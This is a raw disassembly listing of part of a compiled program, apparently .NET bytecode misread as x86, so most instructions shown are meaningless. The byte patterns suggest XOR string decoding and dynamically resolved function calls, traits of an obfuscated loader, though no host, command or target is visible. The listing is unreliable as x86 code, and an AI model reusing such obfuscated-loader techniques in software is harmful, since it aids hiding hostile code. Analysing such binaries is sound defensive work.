  4025d0:	0a 2a                	or     (%edx),%ch
  4025d2:	00 00                	add    %al,(%eax)
  4025d4:	13 30                	adc    (%eax),%esi
  4025d6:	03 00                	add    (%eax),%eax
  4025d8:	24 00                	and    $0x0,%al
  4025da:	00 00                	add    %al,(%eax)
  4025dc:	03 00                	add    (%eax),%eax
  4025de:	00 11                	add    %dl,(%ecx)
  4025e0:	02 28                	add    (%eax),%ch
  4025e2:	38 00                	cmp    %al,(%eax)
  4025e4:	00 0a                	add    %cl,(%edx)
  4025e6:	0a 16                	or     (%esi),%dl
  4025e8:	0b 2b                	or     (%ebx),%ebp
  4025ea:	11 06                	adc    %eax,(%esi)
  4025ec:	07                   	pop    %es
  4025ed:	8f 45 00             	pop    0x0(%ebp)
  4025f0:	00 01                	add    %al,(%ecx)
  4025f2:	25 47 03 61 d2       	and    $0xd2610347,%eax
  4025f7:	52                   	push   %edx
  4025f8:	07                   	pop    %es
  4025f9:	17                   	pop    %ss
  4025fa:	58                   	pop    %eax
  4025fb:	0b 07                	or     (%edi),%eax
  4025fd:	06                   	push   %es
  4025fe:	8e 69 32             	mov    0x32(%ecx),%gs
  402601:	e9 06 2a 13 30       	jmp    0x3053500c
  402606:	03 00                	add    (%eax),%eax
  402608:	2e 00 00             	add    %al,%cs:(%eax)
  40260b:	00 03                	add    %al,(%ebx)
  40260d:	00 00                	add    %al,(%eax)
  40260f:	11 02                	adc    %eax,(%edx)
  402611:	28 38                	sub    %bh,(%eax)
  402613:	00 00                	add    %al,(%eax)
  402615:	0a 0a                	or     (%edx),%cl
  402617:	16                   	push   %ss
  402618:	0b 2b                	or     (%ebx),%ebp
  40261a:	11 06                	adc    %eax,(%esi)
  40261c:	07                   	pop    %es
  40261d:	8f 45 00             	pop    0x0(%ebp)
  402620:	00 01                	add    %al,(%ecx)
  402622:	25 47 03 61 d2       	and    $0xd2610347,%eax
  402627:	52                   	push   %edx
  402628:	07                   	pop    %es
  402629:	17                   	pop    %ss
  40262a:	58                   	pop    %eax
  40262b:	0b 07                	or     (%edi),%eax
  40262d:	06                   	push   %es
  40262e:	8e 69 32             	mov    0x32(%ecx),%gs
  402631:	e9 28 39 00 00       	jmp    0x405f5e
  402636:	0a 06                	or     (%esi),%al
  402638:	6f                   	outsl  %ds:(%esi),(%dx)
  402639:	3a 00                	cmp    (%eax),%al
  40263b:	00 0a                	add    %cl,(%edx)
  40263d:	2a 3a                	sub    (%edx),%bh
  40263f:	02 03                	add    (%ebx),%al
  402641:	28 04 00             	sub    %al,(%eax,%eax,1)
  402644:	00 06                	add    %al,(%esi)
  402646:	16                   	push   %ss
  402647:	28 3b                	sub    %bh,(%ebx)
  402649:	00 00                	add    %al,(%eax)
  40264b:	0a 2a                	or     (%edx),%ch
  40264d:	00 00                	add    %al,(%eax)
  40264f:	00 13                	add    %dl,(%ebx)
  402651:	30 0b                	xor    %cl,(%ebx)
  402653:	00 bc 00 00 00 04 00 	add    %bh,0x40000(%eax,%eax,1)
  40265a:	00 11                	add    %dl,(%ecx)
  40265c:	20 f7                	and    %dh,%bh
  40265e:	00 00                	add    %al,(%eax)
  402660:	00 0a                	add    %cl,(%edx)
  402662:	72 a9                	jb     0x40260d
  402664:	01 00                	add    %eax,(%eax)
  402666:	70 06                	jo     0x40266e
  402668:	28 05 00 00 06 72    	sub    %al,0x72060000
  40266e:	f5                   	cmc
  40266f:	01 00                	add    %eax,(%eax)
  402671:	70 06                	jo     0x402679
  402673:	28 05 00 00 06 0b    	sub    %al,0xb060000
  402679:	72 1f                	jb     0x40269a
  40267b:	02 00                	add    (%eax),%al
  40267d:	70 06                	jo     0x402685
  40267f:	28 06                	sub    %al,(%esi)
  402681:	00 00                	add    %al,(%eax)
  402683:	06                   	push   %es
  402684:	0c 7e                	or     $0x7e,%al
  402686:	34 00                	xor    $0x0,%al
  402688:	00 0a                	add    %cl,(%edx)
  40268a:	0d 7e 34 00 00       	or     $0x347e,%eax
  40268f:	0a 13                	or     (%ebx),%dl
  402691:	04 28                	add    $0x28,%al
  402693:	08 00                	or     %al,(%eax)
  402695:	00 06                	add    %al,(%esi)
  402697:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40269a:	04 7e                	add    $0x7e,%al
  40269c:	34 00                	xor    $0x0,%al
  40269e:	00 0a                	add    %cl,(%edx)
  4026a0:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  4026a3:	00 0a                	add    %cl,(%edx)
  4026a5:	2c 01                	sub    $0x1,%al
  4026a7:	2a 11                	sub    (%ecx),%dl
  4026a9:	04 07                	add    $0x7,%al
  4026ab:	28 07                	sub    %al,(%edi)
  4026ad:	00 00                	add    %al,(%eax)
  4026af:	06                   	push   %es
  4026b0:	0d 09 7e 34 00       	or     $0x347e09,%eax
  4026b5:	00 0a                	add    %cl,(%edx)
  4026b7:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  4026ba:	00 0a                	add    %cl,(%edx)
  4026bc:	2c 01                	sub    $0x1,%al
  4026be:	2a 12                	sub    (%edx),%dl
  4026c0:	05 fe 15 08 00       	add    $0x815fe,%eax
  4026c5:	00 02                	add    %al,(%edx)
  4026c7:	12 05 11 05 28 01    	adc    0x1280511,%al
  4026cd:	00 00                	add    %al,(%eax)
  4026cf:	2b 7d 0e             	sub    0xe(%ebp),%edi
  4026d2:	00 00                	add    %al,(%eax)
  4026d4:	04 09                	add    $0x9,%al
  4026d6:	d0 0d 00 00 02 28    	rorb   $1,0x28020000
  4026dc:	1a 00                	sbb    (%eax),%al
  4026de:	00 0a                	add    %cl,(%edx)
  4026e0:	28 36                	sub    %dh,(%esi)
  4026e2:	00 00                	add    %al,(%eax)
  4026e4:	0a 74 0d 00          	or     0x0(%ebp,%ecx,1),%dh
  4026e8:	00 02                	add    %al,(%edx)
  4026ea:	14 72                	adc    $0x72,%al
  4026ec:	31 02                	xor    %eax,(%edx)
  4026ee:	00 70 02             	add    %dh,0x2(%eax)
  4026f1:	72 31                	jb     0x402724
  4026f3:	02 00                	add    (%eax),%al
  4026f5:	70 28                	jo     0x40271f
  4026f7:	16                   	push   %ss
  4026f8:	00 00                	add    %al,(%eax)
  4026fa:	0a 7e 34             	or     0x34(%esi),%bh
  4026fd:	00 00                	add    %al,(%eax)
  4026ff:	0a 7e 34             	or     0x34(%esi),%bh
  402702:	00 00                	add    %al,(%eax)
  402704:	0a 16                	or     (%esi),%dl
  402706:	08 7e 34             	or     %bh,0x34(%esi)
  402709:	00 00                	add    %al,(%eax)
  40270b:	0a 14 12             	or     (%edx,%edx,1),%dl
  40270e:	05 12 06 6f 30       	add    $0x306f0612,%eax
  402713:	00 00                	add    %al,(%eax)
  402715:	06                   	push   %es
  402716:	26 2a 13             	sub    %es:(%ebx),%dl
  402719:	30 08                	xor    %cl,(%eax)
  40271b:	00 7f 01             	add    %bh,0x1(%edi)
  40271e:	00 00                	add    %al,(%eax)
  402720:	05 00 00 11 20       	add    $0x20110000,%eax
  402725:	f7 00 00 00 0a 72    	testl  $0x720a0000,(%eax)
  40272b:	a9 01 00 70 06       	test   $0x6700001,%eax
  402730:	28 05 00 00 06 72    	sub    %al,0x72060000
  402736:	35 02 00 70 06       	xor    $0x6700002,%eax
  40273b:	28 05 00 00 06 0b    	sub    %al,0xb060000
  402741:	72 57                	jb     0x40279a
  402743:	02 00                	add    (%eax),%al
  402745:	70 06                	jo     0x40274d
  402747:	28 05 00 00 06 0c    	sub    %al,0xc060000
  40274d:	72 71                	jb     0x4027c0
  40274f:	02 00                	add    (%eax),%al
  402751:	70 06                	jo     0x402759
  402753:	28 05 00 00 06 0d    	sub    %al,0xd060000
  402759:	72 93                	jb     0x4026ee
  40275b:	02 00                	add    (%eax),%al
  40275d:	70 06                	jo     0x402765
  40275f:	28 06                	sub    %al,(%esi)
  402761:	00 00                	add    %al,(%eax)
  402763:	06                   	push   %es
  402764:	13 04 72             	adc    (%edx,%esi,2),%eax
  402767:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402768:	02 00                	add    (%eax),%al
  40276a:	70 06                	jo     0x402772
  40276c:	28 06                	sub    %al,(%esi)
  40276e:	00 00                	add    %al,(%eax)
  402770:	06                   	push   %es
  402771:	13 05 72 a5 02 00    	adc    0x2a572,%eax
  402777:	70 06                	jo     0x40277f
  402779:	28 06                	sub    %al,(%esi)
  40277b:	00 00                	add    %al,(%eax)
  40277d:	06                   	push   %es
  40277e:	13 06                	adc    (%esi),%eax
  402780:	7e 34                	jle    0x4027b6
  402782:	00 00                	add    %al,(%eax)
  402784:	0a 13                	or     (%ebx),%dl
  402786:	07                   	pop    %es
  402787:	7e 34                	jle    0x4027bd
  402789:	00 00                	add    %al,(%eax)
  40278b:	0a 13                	or     (%ebx),%dl
  40278d:	08 7e 34             	or     %bh,0x34(%esi)
  402790:	00 00                	add    %al,(%eax)
  402792:	0a 13                	or     (%ebx),%dl
  402794:	09 7e 34             	or     %edi,0x34(%esi)
  402797:	00 00                	add    %al,(%eax)
  402799:	0a 13                	or     (%ebx),%dl
  40279b:	0a 7e 34             	or     0x34(%esi),%bh
  40279e:	00 00                	add    %al,(%eax)
  4027a0:	0a 13                	or     (%ebx),%dl
  4027a2:	0b 28                	or     (%eax),%ebp
  4027a4:	08 00                	or     %al,(%eax)
  4027a6:	00 06                	add    %al,(%esi)
  4027a8:	13 0a                	adc    (%edx),%ecx
  4027aa:	11 0a                	adc    %ecx,(%edx)
  4027ac:	7e 34                	jle    0x4027e2
  4027ae:	00 00                	add    %al,(%eax)
  4027b0:	0a 28                	or     (%eax),%ch
  4027b2:	3c 00                	cmp    $0x0,%al
  4027b4:	00 0a                	add    %cl,(%edx)
  4027b6:	2c 02                	sub    $0x2,%al
  4027b8:	16                   	push   %ss
  4027b9:	2a 11                	sub    (%ecx),%dl
  4027bb:	0a 07                	or     (%edi),%al
  4027bd:	28 07                	sub    %al,(%edi)
  4027bf:	00 00                	add    %al,(%eax)
  4027c1:	06                   	push   %es
  4027c2:	13 07                	adc    (%edi),%eax
  4027c4:	11 0a                	adc    %ecx,(%edx)
  4027c6:	08 28                	or     %ch,(%eax)
  4027c8:	07                   	pop    %es
  4027c9:	00 00                	add    %al,(%eax)
  4027cb:	06                   	push   %es
  4027cc:	13 08                	adc    (%eax),%ecx
  4027ce:	11 0a                	adc    %ecx,(%edx)
  4027d0:	09 28                	or     %ebp,(%eax)
  4027d2:	07                   	pop    %es
  4027d3:	00 00                	add    %al,(%eax)
  4027d5:	06                   	push   %es
  4027d6:	13 09                	adc    (%ecx),%ecx
  4027d8:	11 07                	adc    %eax,(%edi)
  4027da:	7e 34                	jle    0x402810
  4027dc:	00 00                	add    %al,(%eax)
  4027de:	0a 28                	or     (%eax),%ch
  4027e0:	3c 00                	cmp    $0x0,%al
  4027e2:	00 0a                	add    %cl,(%edx)
  4027e4:	2d 1c 11 08 7e       	sub    $0x7e08111c,%eax
  4027e9:	34 00                	xor    $0x0,%al
  4027eb:	00 0a                	add    %cl,(%edx)
  4027ed:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  4027f0:	00 0a                	add    %cl,(%edx)
  4027f2:	2d 0e 11 09 7e       	sub    $0x7e09110e,%eax
  4027f7:	34 00                	xor    $0x0,%al
  4027f9:	00 0a                	add    %cl,(%edx)
  4027fb:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  4027fe:	00 0a                	add    %cl,(%edx)
  402800:	2c 02                	sub    $0x2,%al
  402802:	16                   	push   %ss
  402803:	2a 11                	sub    (%ecx),%dl
  402805:	07                   	pop    %es
  402806:	d0 0e                	rorb   $1,(%esi)
  402808:	00 00                	add    %al,(%eax)
  40280a:	02 28                	add    (%eax),%ch
  40280c:	1a 00                	sbb    (%eax),%al
  40280e:	00 0a                	add    %cl,(%edx)
  402810:	28 36                	sub    %dh,(%esi)
  402812:	00 00                	add    %al,(%eax)
  402814:	0a 74 0e 00          	or     0x0(%esi,%ecx,1),%dh
  402818:	00 02                	add    %al,(%edx)
  40281a:	11 08                	adc    %ecx,(%eax)
  40281c:	d0 0f                	rorb   $1,(%edi)
  40281e:	00 00                	add    %al,(%eax)
  402820:	02 28                	add    (%eax),%ch
  402822:	1a 00                	sbb    (%eax),%al
  402824:	00 0a                	add    %cl,(%edx)
  402826:	28 36                	sub    %dh,(%esi)
  402828:	00 00                	add    %al,(%eax)
  40282a:	0a 74 0f 00          	or     0x0(%edi,%ecx,1),%dh
  40282e:	00 02                	add    %al,(%edx)
  402830:	13 0c 11             	adc    (%ecx,%edx,1),%ecx
  402833:	09 d0                	or     %edx,%eax
  402835:	10 00                	adc    %al,(%eax)
  402837:	00 02                	add    %al,(%edx)
  402839:	28 1a                	sub    %bl,(%edx)
  40283b:	00 00                	add    %al,(%eax)
  40283d:	0a 28                	or     (%eax),%ch
  40283f:	36 00 00             	add    %al,%ss:(%eax)
  402842:	0a 74 10 00          	or     0x0(%eax,%edx,1),%dh
  402846:	00 02                	add    %al,(%edx)
  402848:	13 0d 02 11 04 16    	adc    0x16041102,%ecx
  40284e:	7e 34                	jle    0x402884
  402850:	00 00                	add    %al,(%eax)
  402852:	0a 11                	or     (%ecx),%dl
  402854:	05 11 06 7e 34       	add    $0x347e0611,%eax
  402859:	00 00                	add    %al,(%eax)
  40285b:	0a 6f 34             	or     0x34(%edi),%ch
  40285e:	00 00                	add    %al,(%eax)
  402860:	06                   	push   %es
  402861:	13 0b                	adc    (%ebx),%ecx
  402863:	11 0b                	adc    %ecx,(%ebx)
  402865:	7e 34                	jle    0x40289b
  402867:	00 00                	add    %al,(%eax)
  402869:	0a 28                	or     (%eax),%ch
  40286b:	3c 00                	cmp    $0x0,%al
  40286d:	00 0a                	add    %cl,(%edx)
  40286f:	2d 0f 11 0b 15       	sub    $0x150b110f,%eax
  402874:	28 3e                	sub    %bh,(%esi)
  402876:	00 00                	add    %al,(%eax)
  402878:	0a 28                	or     (%eax),%ch
  40287a:	3c 00                	cmp    $0x0,%al
  40287c:	00 0a                	add    %cl,(%edx)
  40287e:	2c 02                	sub    $0x2,%al
  402880:	16                   	push   %ss
  402881:	2a 11                	sub    (%ecx),%dl
  402883:	0c 11                	or     $0x11,%al
  402885:	0b 03                	or     (%ebx),%eax
  402887:	03 8e 69 12 0e 7e    	add    0x7e0e1269(%esi),%ecx
  40288d:	34 00                	xor    $0x0,%al
  40288f:	00 0a                	add    %cl,(%edx)
  402891:	6f                   	outsl  %ds:(%esi),(%dx)
  402892:	38 00                	cmp    %al,(%eax)
  402894:	00 06                	add    %al,(%esi)
  402896:	26 11 0d 11 0b 6f 3c 	adc    %ecx,%es:0x3c6f0b11
  40289d:	00 00                	add    %al,(%eax)
  40289f:	06                   	push   %es
  4028a0:	26 17                	es pop %ss
  4028a2:	2a 00                	sub    (%eax),%al
  4028a4:	13 30                	adc    (%eax),%esi
  4028a6:	03 00                	add    (%eax),%eax
  4028a8:	76 00                	jbe    0x4028aa
  4028aa:	00 00                	add    %al,(%eax)
  4028ac:	06                   	push   %es
  4028ad:	00 00                	add    %al,(%eax)
  4028af:	11 20                	adc    %esp,(%eax)
  4028b1:	f7 00 00 00 0a 72    	testl  $0x720a0000,(%eax)
  4028b7:	a9 01 00 70 06       	test   $0x6700001,%eax
  4028bc:	28 05 00 00 06 72    	sub    %al,0x72060000
  4028c2:	b7 02                	mov    $0x2,%bh
  4028c4:	00 70 06             	add    %dh,0x6(%eax)
  4028c7:	28 05 00 00 06 0b    	sub    %al,0xb060000
  4028cd:	7e 34                	jle    0x402903
  4028cf:	00 00                	add    %al,(%eax)
  4028d1:	0a 0c 7e             	or     (%esi,%edi,2),%cl
  4028d4:	34 00                	xor    $0x0,%al
  4028d6:	00 0a                	add    %cl,(%edx)
  4028d8:	0d 28 08 00 00       	or     $0x828,%eax
  4028dd:	06                   	push   %es
  4028de:	0d 09 7e 34 00       	or     $0x347e09,%eax
  4028e3:	00 0a                	add    %cl,(%edx)
  4028e5:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  4028e8:	00 0a                	add    %cl,(%edx)
  4028ea:	2c 02                	sub    $0x2,%al
  4028ec:	16                   	push   %ss
  4028ed:	2a 09                	sub    (%ecx),%cl
  4028ef:	07                   	pop    %es
  4028f0:	28 07                	sub    %al,(%edi)
  4028f2:	00 00                	add    %al,(%eax)
  4028f4:	06                   	push   %es
  4028f5:	0c 08                	or     $0x8,%al
  4028f7:	7e 34                	jle    0x40292d
  4028f9:	00 00                	add    %al,(%eax)
  4028fb:	0a 28                	or     (%eax),%ch
  4028fd:	3c 00                	cmp    $0x0,%al
  4028ff:	00 0a                	add    %cl,(%edx)
  402901:	2c 02                	sub    $0x2,%al
  402903:	16                   	push   %ss
  402904:	2a 08                	sub    (%eax),%cl
  402906:	d0 11                	rclb   $1,(%ecx)
  402908:	00 00                	add    %al,(%eax)
  40290a:	02 28                	add    (%eax),%ch
  40290c:	1a 00                	sbb    (%eax),%al
  40290e:	00 0a                	add    %cl,(%edx)
  402910:	28 36                	sub    %dh,(%esi)
  402912:	00 00                	add    %al,(%eax)
  402914:	0a 74 11 00          	or     0x0(%ecx,%edx,1),%dh
  402918:	00 02                	add    %al,(%edx)
  40291a:	02 7e 34             	add    0x34(%esi),%bh
  40291d:	00 00                	add    %al,(%eax)
  40291f:	0a 6f 40             	or     0x40(%edi),%ch
  402922:	00 00                	add    %al,(%eax)
  402924:	06                   	push   %es
  402925:	2a 00                	sub    (%eax),%al
  402927:	00 13                	add    %dl,(%ebx)
  402929:	30 03                	xor    %al,(%ebx)
  40292b:	00 72 00             	add    %dh,0x0(%edx)
  40292e:	00 00                	add    %al,(%eax)
  402930:	06                   	push   %es
  402931:	00 00                	add    %al,(%eax)
  402933:	11 20                	adc    %esp,(%eax)
  402935:	f7 00 00 00 0a 72    	testl  $0x720a0000,(%eax)
  40293b:	a9 01 00 70 06       	test   $0x6700001,%eax
  402940:	28 05 00 00 06 72    	sub    %al,0x72060000
  402946:	e9 02 00 70 06       	jmp    0x6b0294d
  40294b:	28 05 00 00 06 0b    	sub    %al,0xb060000
  402951:	7e 34                	jle    0x402987
  402953:	00 00                	add    %al,(%eax)
  402955:	0a 0c 7e             	or     (%esi,%edi,2),%cl
  402958:	34 00                	xor    $0x0,%al
  40295a:	00 0a                	add    %cl,(%edx)
  40295c:	0d 28 08 00 00       	or     $0x828,%eax
  402961:	06                   	push   %es
  402962:	0d 09 7e 34 00       	or     $0x347e09,%eax
  402967:	00 0a                	add    %cl,(%edx)
  402969:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  40296c:	00 0a                	add    %cl,(%edx)
  40296e:	2c 02                	sub    $0x2,%al
  402970:	16                   	push   %ss
  402971:	2a 09                	sub    (%ecx),%cl
  402973:	07                   	pop    %es
  402974:	28 07                	sub    %al,(%edi)
  402976:	00 00                	add    %al,(%eax)
  402978:	06                   	push   %es
  402979:	0c 08                	or     $0x8,%al
  40297b:	7e 34                	jle    0x4029b1
  40297d:	00 00                	add    %al,(%eax)
  40297f:	0a 28                	or     (%eax),%ch
  402981:	3c 00                	cmp    $0x0,%al
  402983:	00 0a                	add    %cl,(%edx)
  402985:	2c 02                	sub    $0x2,%al
  402987:	16                   	push   %ss
  402988:	2a 08                	sub    (%eax),%cl
  40298a:	d0 15 00 00 02 28    	rclb   $1,0x28020000
  402990:	1a 00                	sbb    (%eax),%al
  402992:	00 0a                	add    %cl,(%edx)
  402994:	28 36                	sub    %dh,(%esi)
  402996:	00 00                	add    %al,(%eax)
  402998:	0a 74 15 00          	or     0x0(%ebp,%edx,1),%dh
  40299c:	00 02                	add    %al,(%edx)
  40299e:	02 03                	add    (%ebx),%al
  4029a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4029a1:	50                   	push   %eax
  4029a2:	00 00                	add    %al,(%eax)
  4029a4:	06                   	push   %es
  4029a5:	2a 00                	sub    (%eax),%al
  4029a7:	00 13                	add    %dl,(%ebx)
  4029a9:	30 03                	xor    %al,(%ebx)
  4029ab:	00 72 00             	add    %dh,0x0(%edx)
  4029ae:	00 00                	add    %al,(%eax)
  4029b0:	06                   	push   %es
  4029b1:	00 00                	add    %al,(%eax)
  4029b3:	11 20                	adc    %esp,(%eax)
  4029b5:	f7 00 00 00 0a 72    	testl  $0x720a0000,(%eax)
  4029bb:	a9 01 00 70 06       	test   $0x6700001,%eax
  4029c0:	28 05 00 00 06 72    	sub    %al,0x72060000
  4029c6:	03 03                	add    (%ebx),%eax
  4029c8:	00 70 06             	add    %dh,0x6(%eax)
  4029cb:	28 05 00 00 06 0b    	sub    %al,0xb060000
  4029d1:	7e 34                	jle    0x402a07
  4029d3:	00 00                	add    %al,(%eax)
  4029d5:	0a 0c 7e             	or     (%esi,%edi,2),%cl
  4029d8:	34 00                	xor    $0x0,%al
  4029da:	00 0a                	add    %cl,(%edx)
  4029dc:	0d 28 08 00 00       	or     $0x828,%eax
  4029e1:	06                   	push   %es
  4029e2:	0d 09 7e 34 00       	or     $0x347e09,%eax
  4029e7:	00 0a                	add    %cl,(%edx)
  4029e9:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  4029ec:	00 0a                	add    %cl,(%edx)
  4029ee:	2c 02                	sub    $0x2,%al
  4029f0:	16                   	push   %ss
  4029f1:	2a 09                	sub    (%ecx),%cl
  4029f3:	07                   	pop    %es
  4029f4:	28 07                	sub    %al,(%edi)
  4029f6:	00 00                	add    %al,(%eax)
  4029f8:	06                   	push   %es
  4029f9:	0c 08                	or     $0x8,%al
  4029fb:	7e 34                	jle    0x402a31
  4029fd:	00 00                	add    %al,(%eax)
  4029ff:	0a 28                	or     (%eax),%ch
  402a01:	3c 00                	cmp    $0x0,%al
  402a03:	00 0a                	add    %cl,(%edx)
  402a05:	2c 02                	sub    $0x2,%al
  402a07:	16                   	push   %ss
  402a08:	2a 08                	sub    (%eax),%cl
  402a0a:	d0 12                	rclb   $1,(%edx)
  402a0c:	00 00                	add    %al,(%eax)
  402a0e:	02 28                	add    (%eax),%ch
  402a10:	1a 00                	sbb    (%eax),%al
  402a12:	00 0a                	add    %cl,(%edx)
  402a14:	28 36                	sub    %dh,(%esi)
  402a16:	00 00                	add    %al,(%eax)
  402a18:	0a 74 12 00          	or     0x0(%edx,%edx,1),%dh
  402a1c:	00 02                	add    %al,(%edx)
  402a1e:	02 03                	add    (%ebx),%al
  402a20:	6f                   	outsl  %ds:(%esi),(%dx)
  402a21:	44                   	inc    %esp
  402a22:	00 00                	add    %al,(%eax)
  402a24:	06                   	push   %es
  402a25:	2a 00                	sub    (%eax),%al
  402a27:	00 13                	add    %dl,(%ebx)
  402a29:	30 03                	xor    %al,(%ebx)
  402a2b:	00 70 00             	add    %dh,0x0(%eax)
  402a2e:	00 00                	add    %al,(%eax)
  402a30:	07                   	pop    %es
  402a31:	00 00                	add    %al,(%eax)
  402a33:	11 20                	adc    %esp,(%eax)
  402a35:	f7 00 00 00 0a 72    	testl  $0x720a0000,(%eax)
  402a3b:	35 03 00 70 06       	xor    $0x6700003,%eax
  402a40:	28 05 00 00 06 72    	sub    %al,0x72060000
  402a46:	47                   	inc    %edi
  402a47:	03 00                	add    (%eax),%eax
  402a49:	70 06                	jo     0x402a51
  402a4b:	28 05 00 00 06 0b    	sub    %al,0xb060000
  402a51:	28 09                	sub    %cl,(%ecx)
  402a53:	00 00                	add    %al,(%eax)
  402a55:	06                   	push   %es
  402a56:	0c 08                	or     $0x8,%al
  402a58:	7e 34                	jle    0x402a8e
  402a5a:	00 00                	add    %al,(%eax)
  402a5c:	0a 28                	or     (%eax),%ch
  402a5e:	3c 00                	cmp    $0x0,%al
  402a60:	00 0a                	add    %cl,(%edx)
  402a62:	2c 01                	sub    $0x1,%al
  402a64:	2a 08                	sub    (%eax),%cl
  402a66:	07                   	pop    %es
  402a67:	28 07                	sub    %al,(%edi)
  402a69:	00 00                	add    %al,(%eax)
  402a6b:	06                   	push   %es
  402a6c:	0d 09 7e 34 00       	or     $0x347e09,%eax
  402a71:	00 0a                	add    %cl,(%edx)
  402a73:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  402a76:	00 0a                	add    %cl,(%edx)
  402a78:	2c 01                	sub    $0x1,%al
  402a7a:	2a 09                	sub    (%ecx),%cl
  402a7c:	d0 0c 00             	rorb   $1,(%eax,%eax,1)
  402a7f:	00 02                	add    %al,(%edx)
  402a81:	28 1a                	sub    %bl,(%edx)
  402a83:	00 00                	add    %al,(%eax)
  402a85:	0a 28                	or     (%eax),%ch
  402a87:	36 00 00             	add    %al,%ss:(%eax)
  402a8a:	0a 74 0c 00          	or     0x0(%esp,%ecx,1),%dh
  402a8e:	00 02                	add    %al,(%edx)
  402a90:	20 80 69 67 ff 02    	and    %al,0x2ff6769(%eax)
  402a96:	5a                   	pop    %edx
  402a97:	6a 13                	push   $0x13
  402a99:	04 16                	add    $0x16,%al
  402a9b:	12 04 6f             	adc    (%edi,%ebp,2),%al
  402a9e:	2c 00                	sub    $0x0,%al
  402aa0:	00 06                	add    %al,(%esi)
  402aa2:	26 2a 1b             	sub    %es:(%ebx),%bl
  402aa5:	30 07                	xor    %al,(%edi)
  402aa7:	00 98 02 00 00 08    	add    %bl,0x8000002(%eax)
  402aad:	00 00                	add    %al,(%eax)
  402aaf:	11 20                	adc    %esp,(%eax)
  402ab1:	f7 00 00 00 0a 72    	testl  $0x720a0000,(%eax)
  402ab7:	35 03 00 70 06       	xor    $0x6700003,%eax
  402abc:	28 05 00 00 06 72    	sub    %al,0x72060000
  402ac2:	79 03                	jns    0x402ac7
  402ac4:	00 70 06             	add    %dh,0x6(%eax)
  402ac7:	28 05 00 00 06 0b    	sub    %al,0xb060000
  402acd:	72 a3                	jb     0x402a72
  402acf:	03 00                	add    (%eax),%eax
  402ad1:	70 06                	jo     0x402ad9
  402ad3:	28 05 00 00 06 0c    	sub    %al,0xc060000
  402ad9:	72 bd                	jb     0x402a98
  402adb:	03 00                	add    (%eax),%eax
  402add:	70 06                	jo     0x402ae5
  402adf:	28 05 00 00 06 0d    	sub    %al,0xd060000
  402ae5:	72 e7                	jb     0x402ace
  402ae7:	03 00                	add    (%eax),%eax
  402ae9:	70 06                	jo     0x402af1
  402aeb:	28 05 00 00 06 13    	sub    %al,0x13060000
  402af1:	04 72                	add    $0x72,%al
  402af3:	09 04 00             	or     %eax,(%eax,%eax,1)
  402af6:	70 06                	jo     0x402afe
  402af8:	28 06                	sub    %al,(%esi)
  402afa:	00 00                	add    %al,(%eax)
  402afc:	06                   	push   %es
  402afd:	13 05 72 1b 04 00    	adc    0x41b72,%eax
  402b03:	70 06                	jo     0x402b0b
  402b05:	28 06                	sub    %al,(%esi)
  402b07:	00 00                	add    %al,(%eax)
  402b09:	06                   	push   %es
  402b0a:	13 06                	adc    (%esi),%eax
  402b0c:	7e 34                	jle    0x402b42
  402b0e:	00 00                	add    %al,(%eax)
  402b10:	0a 13                	or     (%ebx),%dl
  402b12:	07                   	pop    %es
  402b13:	7e 34                	jle    0x402b49
  402b15:	00 00                	add    %al,(%eax)
  402b17:	0a 13                	or     (%ebx),%dl
  402b19:	08 7e 34             	or     %bh,0x34(%esi)
  402b1c:	00 00                	add    %al,(%eax)
  402b1e:	0a 13                	or     (%ebx),%dl
  402b20:	09 7e 34             	or     %edi,0x34(%esi)
  402b23:	00 00                	add    %al,(%eax)
  402b25:	0a 13                	or     (%ebx),%dl
  402b27:	0a 7e 34             	or     0x34(%esi),%bh
  402b2a:	00 00                	add    %al,(%eax)
  402b2c:	0a 13                	or     (%ebx),%dl
  402b2e:	0b 7e 34             	or     0x34(%esi),%edi
  402b31:	00 00                	add    %al,(%eax)
  402b33:	0a 13                	or     (%ebx),%dl
  402b35:	0c 28                	or     $0x28,%al
  402b37:	09 00                	or     %eax,(%eax)
  402b39:	00 06                	add    %al,(%esi)
  402b3b:	13 07                	adc    (%edi),%eax
  402b3d:	11 07                	adc    %eax,(%edi)
  402b3f:	7e 34                	jle    0x402b75
  402b41:	00 00                	add    %al,(%eax)
  402b43:	0a 28                	or     (%eax),%ch
  402b45:	3c 00                	cmp    $0x0,%al
  402b47:	00 0a                	add    %cl,(%edx)
  402b49:	2c 02                	sub    $0x2,%al
  402b4b:	16                   	push   %ss
  402b4c:	2a 08                	sub    (%eax),%cl
  402b4e:	28 09                	sub    %cl,(%ecx)
  402b50:	00 00                	add    %al,(%eax)
  402b52:	06                   	push   %es
  402b53:	13 08                	adc    (%eax),%ecx
  402b55:	11 08                	adc    %ecx,(%eax)
  402b57:	7e 34                	jle    0x402b8d
  402b59:	00 00                	add    %al,(%eax)
  402b5b:	0a 28                	or     (%eax),%ch
  402b5d:	3c 00                	cmp    $0x0,%al
  402b5f:	00 0a                	add    %cl,(%edx)
  402b61:	2c 02                	sub    $0x2,%al
  402b63:	16                   	push   %ss
  402b64:	2a 11                	sub    (%ecx),%dl
  402b66:	07                   	pop    %es
  402b67:	07                   	pop    %es
  402b68:	28 07                	sub    %al,(%edi)
  402b6a:	00 00                	add    %al,(%eax)
  402b6c:	06                   	push   %es
  402b6d:	13 09                	adc    (%ecx),%ecx
  402b6f:	11 08                	adc    %ecx,(%eax)
  402b71:	09 28                	or     %ebp,(%eax)
  402b73:	07                   	pop    %es
  402b74:	00 00                	add    %al,(%eax)
  402b76:	06                   	push   %es
  402b77:	13 0a                	adc    (%edx),%ecx
  402b79:	11 08                	adc    %ecx,(%eax)
  402b7b:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  402b7e:	07                   	pop    %es
  402b7f:	00 00                	add    %al,(%eax)
  402b81:	06                   	push   %es
  402b82:	13 0b                	adc    (%ebx),%ecx
  402b84:	11 09                	adc    %ecx,(%ecx)
  402b86:	7e 34                	jle    0x402bbc
  402b88:	00 00                	add    %al,(%eax)
